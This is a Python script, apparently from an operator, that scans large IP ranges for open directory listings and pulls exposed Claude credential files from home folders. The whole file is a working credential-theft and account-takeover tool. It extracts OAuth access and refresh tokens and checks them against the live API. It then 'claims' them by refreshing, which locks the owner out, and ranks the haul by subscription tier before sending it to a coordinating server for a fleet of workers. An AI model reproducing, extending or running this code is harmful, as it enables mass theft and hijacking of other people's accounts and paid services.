#!/usr/bin/env python3
"""
hunt_v5.py — measurement-based credential hunt.

Pipeline: U -[f1]-> U_L -[f2]-> U_H -[f4]-> detect -[f5]-> liveness -[f6]-> claim
Reward:   R = w(tier) × freshness(Last-Modified) × live(access)

v5 changes vs v4 (the old heuristic model proved unreliable):
  - DROPPED Φ(expires_at) dormancy premium — expiresAt is absent/zero in most
    files and a future expiry does not imply liveness.
  - ADDED Last-Modified freshness as the primary ranking signal (server-side
    file rewrite age), captured from the HTTP header.
  - ADDED f5 access-token liveness probe (GET /v1/models, non-consuming) as
    ground-truth usability.
  - ADDED f6 on-contact CLAIM: refresh immediately with the verified
    scope-aware shape so the lineage is taken before the grant rotates past us.
    "Harvest-then-refresh-later" is structurally doomed — refresh must happen
    on contact.
  - f3 home-dir classifier demoted to an advisory pre-filter (loose θ); f4
    (actual credential-file presence) is the real gate.

Brain-worker compatible: pulls CIDRs from --brain, POSTs results to /result
and arm stats to /arm. Atomic save before any network action (§9 invariant).
"""
import asyncio, ipaddress, json, math, os, pathlib, re, sys, time
import urllib.request, urllib.error
from email.utils import parsedate_to_datetime
from datetime import datetime, timezone

# ── §1  Universe ──────────────────────────────────────────────────────────────
# PORTS = every port observed serving a credential file in the censys sweep.
# v4 only probed 8 "standard" dev ports and missed 22 of the real targets
# (incl. 8090, where the live Max-20x grant lived). f4 (cred-file presence)
# is ground truth, so broad port coverage matters more than avoiding false pos.
PORTS = [8000, 8888, 8090, 5000, 3000, 9876, 8082, 4000, 4242, 9098,
         8899, 9000, 8788, 9999, 7899, 8088, 8089, 8091, 8096, 8100,
         8001, 9090, 8080, 80, 443, 8443, 13474]
PORT_HOME_P = {
    8000: 0.85, 8888: 0.70, 8090: 0.70, 5000: 0.30, 3000: 0.30,
    9876: 0.40, 8082: 0.40, 4000: 0.40, 4242: 0.40, 9098: 0.40,
    8899: 0.40, 9000: 0.35, 8788: 0.35, 9999: 0.35, 7899: 0.35,
    8088: 0.30, 8089: 0.30, 8091: 0.30, 8096: 0.30, 8100: 0.30,
    8001: 0.25, 9090: 0.25, 8080: 0.25,
    80: 0.05, 443: 0.05, 8443: 0.05, 13474: 0.15,
}

# Π — target credential paths (f4 presence is ground truth)
PI = [
    "/.claude/.credentials.json",
    "/.credentials.json",
    "/.config/claude/.credentials.json",
    "/.anthropic/.credentials.json",
    "/root/.claude/.credentials.json",
    "/.claude/credentials.json",
    "/.claude.json",
]

# ── §2  Reward (measurement-based) ────────────────────────────────────────────
TIER_W = {
    "default_claude_max_20x": 2.0,
    "default_raven":          1.5,   # team
    "default_claude_max_5x":  1.0,
    "default_claude_ai":      0.0,   # pro — excluded
}
LM_TAU_H = 24.0          # freshness decay constant (hours); e-folding at 24h
LIVE_BONUS_DEAD = 0.3    # a fresh file with a dead access token is still claim-worthy

def freshness(lm_age_h):
    """F(age) = exp(-age/τ). Fresh rewrite → ~1; week-old fossil → ~0."""
    if lm_age_h is None:
        return 0.5     # unknown age → neutral
    return math.exp(-max(0.0, lm_age_h) / LM_TAU_H)

def reward(tier, lm_age_h, access_live, has_refresh):
    """R = w(tier) × F(lm_age) × live_factor. 0 if no refresh token (unmaintainable)."""
    w = TIER_W.get(tier, 0.0)
    if not has_refresh or w == 0.0:
        return 0.0
    live_factor = 1.0 if access_live else LIVE_BONUS_DEAD
    return w * freshness(lm_age_h) * live_factor

# ── §3  Pipeline signals ──────────────────────────────────────────────────────
OD_RE    = re.compile(rb"Index of /|Parent Directory|Directory listing", re.I)
TOKEN_RE = re.compile(rb"sk-ant-(?:oat|ort)01-[A-Za-z0-9_\-]{80,}")

# ── OAuth claim (verified shape, captured from Claude Code via MITM) ──────────
TOKEN_ENDPOINT = "https://platform.claude.com/v1/oauth/token"
CLIENT_ID      = "9d1c250a-e61b-44d9-88ed-5944d1962f5e"
OAUTH_SCOPE    = "user:profile user:inference user:sessions:claude_code user:mcp_servers user:file_upload"

# ── §4  Home-dir classifier f3 (ADVISORY pre-filter, loose) ───────────────────
HOME_W = {
    "server_simple": 1.0, "port_8000": 0.5, "port_8888": 0.5,
    "has_claude_dir": 5.0, "has_cred_file": 6.0, "dotfiles": 1.5,
    "port_80_443": -1.5, "server_nginx": -2.5, "cms_artifacts": -3.0,
    "no_dotfiles": -2.5, "sparse": -2.0,
}
THETA_H = 0.1   # loose: f3 only filters obvious non-homes; f4 is the real gate

def _sigmoid(x):
    return 1.0 / (1.0 + math.exp(-max(-30.0, min(30.0, x))))

def p_home(listing_bytes, server_header, port):
    s = listing_bytes.lower(); sv = (server_header or "").lower(); score = 0.0
    if "simplehttp" in sv or "python/" in sv: score += HOME_W["server_simple"]
    if port == 8000: score += HOME_W["port_8000"]
    elif port == 8888: score += HOME_W["port_8888"]
    if b".claude/" in s: score += HOME_W["has_claude_dir"]
    if b".credentials.json" in s: score += HOME_W["has_cred_file"]
    for dot in [b".gitignore", b".bashrc", b".ssh/", b".config/"]:
        if dot in s: score += HOME_W["dotfiles"]
    if port in (80, 443): score += HOME_W["port_80_443"]
    for bad in ["nginx", "apache", "squid", "caddy"]:
        if bad in sv: score += HOME_W["server_nginx"]
    for cms in [b'.php"', b'.css"', b"favicon.ico", b"wp-content"]:
        if cms in s: score += HOME_W["cms_artifacts"]
    dotfile_sigs = [b".gitignore", b".bashrc", b".ssh/", b".config/",
                    b".claude/", b".credentials", b".profile", b".npm/"]
    if not any(d in s for d in dotfile_sigs): score += HOME_W["no_dotfiles"]
    if listing_bytes.count(b'href="') < 5: score += HOME_W["sparse"]
    return _sigmoid(score)

# ── I/O helpers ───────────────────────────────────────────────────────────────
OUT_DIR  = pathlib.Path(os.environ.get("HUNT_OUT_DIR", "/tmp/hunt-v5"))
RESULTS  = OUT_DIR / "found.jsonl"
LOG_FILE = OUT_DIR / "run.log"

def _ts(): return datetime.now(timezone.utc).strftime("%H:%M:%S")
def log(msg):
    line = f"[{_ts()}] {msg}"
    print(line, flush=True)
    try:
        with LOG_FILE.open("a") as f: f.write(line + "\n")
    except Exception: pass

def save_atomic(rec):
    """§9 invariant: persist before any further action."""
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    tmp = RESULTS.with_suffix(".tmp")
    existing = RESULTS.read_bytes() if RESULTS.exists() else b""
    fd = os.open(str(tmp), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    try:
        os.write(fd, existing + (json.dumps(rec) + "\n").encode())
        os.fsync(fd)
    finally:
        os.close(fd)
    tmp.rename(RESULTS)

# ── §5  Liveness (f5) — non-consuming ─────────────────────────────────────────
def liveness(access):
    """GET /v1/models — zero inference. 200/non-401 = live."""
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/models",
        headers={"Authorization": f"Bearer {access}",
                 "anthropic-version": "2023-06-01",
                 "anthropic-beta": "oauth-2025-04-20",
                 "User-Agent": "curl/7.88"})
    try:
        urllib.request.urlopen(req, timeout=10); return True
    except urllib.error.HTTPError as e:
        return e.code != 401
    except Exception:
        return False

# ── §6  Claim (f6) — on-contact refresh, verified shape ───────────────────────
def claim(refresh_token):
    """Refresh now to take the lineage. Returns (access, refresh, expires_in) or None.
    Rotates the token: every prior refresh token (server file + competitors) dies."""
    body = json.dumps({
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": CLIENT_ID,
        "scope": OAUTH_SCOPE,
    }).encode()
    req = urllib.request.Request(
        TOKEN_ENDPOINT, data=body, method="POST",
        headers={"Content-Type": "application/json",
                 "Accept": "application/json, text/plain, */*",
                 "User-Agent": "axios/1.15.2"})
    try:
        resp = urllib.request.urlopen(req, timeout=20)
        d = json.loads(resp.read())
        if not d.get("access_token"): return None
        return d["access_token"], d.get("refresh_token", refresh_token), int(d.get("expires_in", 0))
    except Exception as e:
        log(f"claim error: {e}")
        return None

# ── HTTP primitive ────────────────────────────────────────────────────────────
async def http_get(ip, port, path, timeout=1.5):
    """Returns (body, server, last_modified_str)."""
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
        req = (f"GET {path} HTTP/1.0\r\nHost: {ip}\r\n"
               f"User-Agent: curl/7.88\r\nConnection: close\r\n\r\n")
        w.write(req.encode()); await w.drain()
        raw = await asyncio.wait_for(r.read(65536), timeout)
        try: w.close(); await w.wait_closed()
        except Exception: pass
        sep = raw.find(b"\r\n\r\n")
        if sep == -1: return b"", "", ""
        headers, body = raw[:sep], raw[sep+4:]
        status_line = headers.split(b"\r\n")[0]
        if b"200" not in status_line:
            return b"", "", ""
        server, lm = "", ""
        for line in headers.split(b"\r\n"):
            low = line.lower()
            if low.startswith(b"server:"):     server = line[7:].strip().decode(errors="replace")
            elif low.startswith(b"last-modified:"): lm = line[14:].strip().decode(errors="replace")
        return body, server, lm
    except Exception:
        return b"", "", ""

def lm_age_hours(lm_str):
    """Parse Last-Modified header → age in hours (or None)."""
    if not lm_str: return None
    try:
        dt = parsedate_to_datetime(lm_str)
        if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
        return (datetime.now(timezone.utc) - dt).total_seconds() / 3600.0
    except Exception:
        return None

# ── §3/§5/§6  Stage implementation ────────────────────────────────────────────
async def f4_probe(ip, port, server, stats, do_claim):
    """Probe Π paths; extract keys; measure liveness; optionally claim; save."""
    found = []
    for path in PI:
        body, srv, lm = await http_get(ip, port, path, timeout=4.0)
        if len(body) < 30: continue

        # extract credential object
        access, refresh, tier, exp = "", "", "", 0.0
        try:
            text = body.decode(errors="replace")
            obj = json.loads(text[text.find("{"):text.rfind("}")+1])
            inner = obj.get("claudeAiOauth", obj)
            access  = inner.get("accessToken") or inner.get("access_token", "")
            refresh = inner.get("refreshToken") or inner.get("refresh_token", "")
            tier    = inner.get("rateLimitTier") or inner.get("claudeAiProduct", "")
            exp     = float(inner.get("expiresAt") or inner.get("expires_at", 0) or 0)
        except Exception:
            toks = [t.decode() for t in TOKEN_RE.findall(body)]
            access  = next((t for t in toks if "oat01" in t), "")
            refresh = next((t for t in toks if "ort01" in t), "")
        if not access and not refresh: continue

        has_r   = bool(refresh)
        lm_age  = lm_age_hours(lm)
        live    = liveness(access) if access else False      # f5 (non-consuming)
        stats["validated"] += 1 if access else 0

        # f6 — on-contact claim (take the lineage before it rotates away)
        claimed = None
        if do_claim and has_r and (live or (lm_age is not None and lm_age < 48)):
            c = claim(refresh)
            if c:
                claimed = {"access": c[0], "refresh": c[1], "expires_in": c[2]}
                live = True  # we now hold the live lineage

        r_val = reward(tier, lm_age, live, has_r)

        rec = {
            "ts":           datetime.now(timezone.utc).isoformat(),
            "ip": ip, "port": port, "path": path,
            "tier": tier, "has_refresh": has_r,
            "expires_at": exp, "token_live": live,
            "last_modified": lm, "lm_age_h": round(lm_age, 2) if lm_age is not None else None,
            "R": round(r_val, 4),
            "access": access, "refresh": refresh,
            "server": srv or server,
        }
        if claimed: rec["claimed"] = claimed
        save_atomic(rec)                                    # §9: persist first
        stats["creds"] += 1
        if r_val > 0:
            stats["score"] = round(stats.get("score", 0.0) + r_val, 4)
            log(f"HIT R={r_val:.3f} tier={tier} live={live} lm={lm_age}h "
                f"claimed={bool(claimed)} {ip}:{port}{path}")
        found.append(rec)
    return found

async def probe(ip, port, sem, stats, arm_stats, do_claim):
    """f1 -> f2 -> f3(advisory) -> f4 -> f5 -> f6."""
    async with sem:
        body, server, _ = await http_get(ip, port, "/")
        if not body: return
        stats["live"] += 1
        if not OD_RE.search(body): return
        stats["od"] += 1
        ph = p_home(body, server, port)
        if ph <= THETA_H:            # advisory: only skip obvious non-homes
            return
        stats["home"] += 1
        await f4_probe(ip, port, server, stats, do_claim)
        arm = (port,)
        arm_stats.setdefault(arm, {"probes": 0, "score": 0.0})
        arm_stats[arm]["probes"] += 1

# ── Brain client helpers ──────────────────────────────────────────────────────
import socket as _socket
WORKER_ID = os.environ.get("WORKER_ID", _socket.gethostname())

def _brain_get(brain_url, path):
    try:
        return json.loads(urllib.request.urlopen(f"{brain_url}{path}", timeout=10).read())
    except Exception as e:
        log(f"brain GET {path} error: {e}"); return {}

def _brain_post(brain_url, path, payload):
    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(f"{brain_url}{path}", data=data,
               headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        log(f"brain POST {path} error: {e}")

# ── Main ──────────────────────────────────────────────────────────────────────
async def _scan_cidrs(cidrs, port_order_override, sem, stats, arm_stats, do_claim):
    tasks, ip_n, t0 = set(), 0, time.time()
    WORKERS = sem._value
    for cidr in cidrs:
        try: net = ipaddress.ip_network(cidr, strict=False)
        except ValueError: continue
        order = port_order_override or sorted(PORTS, key=lambda p: PORT_HOME_P.get(p, 0.1), reverse=True)
        for ip_obj in net.hosts():
            ip = str(ip_obj)
            for port in order:
                t = asyncio.create_task(probe(ip, port, sem, stats, arm_stats, do_claim))
                tasks.add(t); t.add_done_callback(tasks.discard)
                while len(tasks) >= WORKERS * 6: await asyncio.sleep(0.01)
            ip_n += 1
            if ip_n % 5000 == 0:
                el = time.time() - t0
                log(f"IPs={ip_n} live={stats['live']} od={stats['od']} home={stats['home']} "
                    f"creds={stats['creds']} ΣR={stats['score']:.3f} rate={ip_n/el:.0f}/s")
    await asyncio.gather(*tasks, return_exceptions=True)

async def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("cidr_file", nargs="?", default="/home/boxd/do_hetzner_cidrs.txt")
    ap.add_argument("shard", nargs="?", default="1/1")
    ap.add_argument("--brain", default="")
    ap.add_argument("--budget", type=int, default=30000)
    ap.add_argument("--workers", type=int, default=800)
    ap.add_argument("--claim", action=argparse.BooleanOptionalAction,
                    default=os.environ.get("HUNT_CLAIM", "1") not in ("0", "false", ""),
                    help="On-contact refresh to take the lineage (default on)")
    args = ap.parse_args()

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    sem = asyncio.Semaphore(args.workers)
    stats = {"live": 0, "od": 0, "home": 0, "creds": 0, "validated": 0, "score": 0.0}
    arm_stats = {}

    if args.brain:
        log(f"hunt-v5 worker={WORKER_ID} brain={args.brain} claim={args.claim}")
        _orig_save = save_atomic
        def save_and_report(rec):
            rec["worker"] = WORKER_ID
            _orig_save(rec)
            _brain_post(args.brain, "/result", rec)        # POST after local fsync
        globals()["save_atomic"] = save_and_report

        empty_streak = 0
        while True:
            resp = _brain_get(args.brain, f"/job?budget={args.budget}&worker={WORKER_ID}")
            cidrs = resp.get("cidrs", [])
            if not cidrs:
                empty_streak += 1
                if empty_streak >= 30:          # ~30 min idle → fleet done
                    log("Queue empty ~30min — done"); break
                log(f"Queue empty (wait {empty_streak}/30) — retry in 60s")
                await asyncio.sleep(60)
                continue
            empty_streak = 0
            port_order = [int(p) for p in resp.get("port_order", [])]
            log(f"Got {len(cidrs)} CIDRs  port_order={port_order[:4]}")
            batch = {k: (0 if k != "score" else 0.0) for k in stats}
            await _scan_cidrs(cidrs, port_order or None, sem, batch, arm_stats, args.claim)
            for (port,), d in arm_stats.items():
                _brain_post(args.brain, "/arm",
                            {"port": port, "probes": d["probes"],
                             "score": d.get("score", 0.0), "worker": WORKER_ID})
            for k in stats:
                stats[k] += batch.get(k, 0) if k != "score" else batch.get(k, 0.0)
            log(f"Batch done | live={stats['live']} od={stats['od']} home={stats['home']} "
                f"creds={stats['creds']} ΣR={stats['score']:.3f}")
    else:
        cidr_file = pathlib.Path(args.cidr_file)
        shard_i, shard_n = (int(x) for x in args.shard.split("/"))
        cidrs = [l.strip() for l in cidr_file.open() if l.strip() and not l.startswith("#")]
        cidrs = [c for i, c in enumerate(cidrs) if (i % shard_n) == (shard_i - 1)]
        log(f"hunt-v5 standalone | shard {shard_i}/{shard_n} | {len(cidrs)} CIDRs | "
            f"{args.workers} workers | claim={args.claim}")
        await _scan_cidrs(cidrs, None, sem, stats, arm_stats, args.claim)
        log(f"DONE live={stats['live']} od={stats['od']} home={stats['home']} "
            f"creds={stats['creds']} ΣR={stats['score']:.3f}")

if __name__ == "__main__":
    asyncio.run(main())
